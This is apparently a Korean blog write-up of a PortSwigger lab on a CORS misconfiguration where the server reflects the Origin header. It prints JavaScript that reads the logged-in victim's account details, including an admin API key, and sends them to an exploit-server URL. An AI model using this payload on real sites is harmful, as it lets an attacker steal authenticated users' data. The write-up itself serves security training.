---
layout: post
title: "Burp Academy-CORS 취약점: CORS vulnerability with basic origin reflection"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, CORS취약점]
toc: true
---

# 개요
- [CORS]({% post_url 2023-06-28-CORS-basic %})에 관련된 취약점이다. 
- CORS 취약점에 대한 설명은 [여기]({% post_url 2023-06-27-burp-academy-cors %}) 
- 문제 주소: : https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack
- 난이도: APPRENTICE (쉬움)

# 문제 설명
- 서버에는 클라이언트가 보낸 Origin헤더를 무조건 신뢰하는 CORS 취약점이 있다. 
- 이 취약점을 이용해서 서버 관리자의 API Key를 얻어내는 자바스크립트 코드를 exploit server를 이용해서 서버로 보낸다. 
- 얻어낸 서버 관리자의 API Key를 제출하면 문제가 풀린다. 

```
This website has an insecure CORS configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter
```

# 풀이 

## CORS 취약점이 있는 곳을 찾기 
문제에서 주어진 계정으로 로그인을 해본다. 그러면 로그인 후의 화면에서 apiKey가 표시되는 것을 볼 수 있다. 

![apiKey확인](/images/burp-academy-cors-1-1.png)

apiKey를 획득하는 요청을 Burp Proxy로 관찰해보면 보면 `GET /accountDetails` 요청인 것을 알 수 있다. Burp Repeater를 사용해서 이 요청에 Origin헤더를 추가해서 보내본다. 그러면 Origin 헤더에 설정한 값을 Access-Control-Allow-Origin 응답 헤더에 그대로 설정해서 응답해주는 것을 알 수 있다. 이 것으로 CORS 취약점이 있는 곳을 확인했다. 

![CORS취약점 확인](/images/burp-academy-cors-1-2.png)

## exploit 코드 생각 
다음 코드를 저장하고 Deliver exploit to victim 버튼을 눌러 사이트 관리자에게 전달한다. 

```html
<html>
    <body>
        <script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a3600380333e31c80bc30ad00f40024.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.setRequestHeader("Origin", "https://exploit-0af4007403d8e3d680182fa601dd0050.exploit-server.net"); // 자바스크립트로 Origin 헤더는 수정할 수 없다. 그리고 이 코드가 실행되는 곳은 exploit서버이기 때문에 브라우저가 Origin헤더를 설정해준다. 따라서 이 코드는 의미가 없다. 
req.send();

function reqListener() {
   location='https://exploit-0af4007403d8e3d680182fa601dd0050.exploit-server.net/exploit?key='+this.responseText;
};
</script>
</body>
</html>
```

## 억세스 로그를 보고 apiKey를 확인
억세스 로그를 보면 다음과 같이 관리자의 억세스가 로그로 다수 확인된다. apiKey를 포함한 부분이 보인다. 

![관리자의 apiKey확인](/images/burp-academy-cors-1-3.png)

URL인코딩된 부분(%20)을 제외한 값을 문제 서버에 제출하면 문제가 풀린다. 

![풀이 성공](/images/burp-academy-cors-1-success.png)